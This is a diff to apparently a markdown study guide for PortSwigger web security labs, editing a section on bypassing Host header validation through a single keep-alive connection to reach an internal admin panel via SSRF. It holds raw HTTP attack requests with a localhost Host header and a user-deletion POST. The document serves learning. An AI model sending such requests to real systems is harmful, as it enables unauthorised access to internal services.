@@ -160,9 +160,9 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 
 [PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  
 
-### HOST Connection State
+### HOST Connection State  
 
->Sending grouped request in sequence using single connection and setting the connection header to keep-alive, bypass host header validation and enable SSRF exploit of local server.  
+>Target is vulnerable to routing-based SSRF via the Host header. Sending grouped request in sequence using single connection and setting the connection header to keep-alive, bypass host header validation and enable SSRF exploit of local server.  
 
 ```html
 GET /intranet/service HTTP/1.1
@@ -173,22 +173,26 @@ Content-Type: text/plain;charset=UTF-8
 Connection: keep-alive
 ```  
 
-<sub>Next request is the second tab in group sequence of requests</sub>  
+>Next request is the second tab in group sequence of requests.  
 
 ```html
 POST /service/intranet HTTP/1.1
 Host: localhost
 Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
 Content-Type: x-www-form-urlencoded
-Content-Length: CORRECT
+Content-Length: 53
 
 csrf=YOUR-CSRF-TOKEN&username=carlos
 ```  
 
-[Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  
+>Observe that the second request has successfully accessed the admin panel.  
+
+![single connection](single-connection.png)  
+
+[PortSwigger Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  
 
 
-## HTTP Request Smuggling
+## HTTP Request Smuggling  
 
 >Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
   
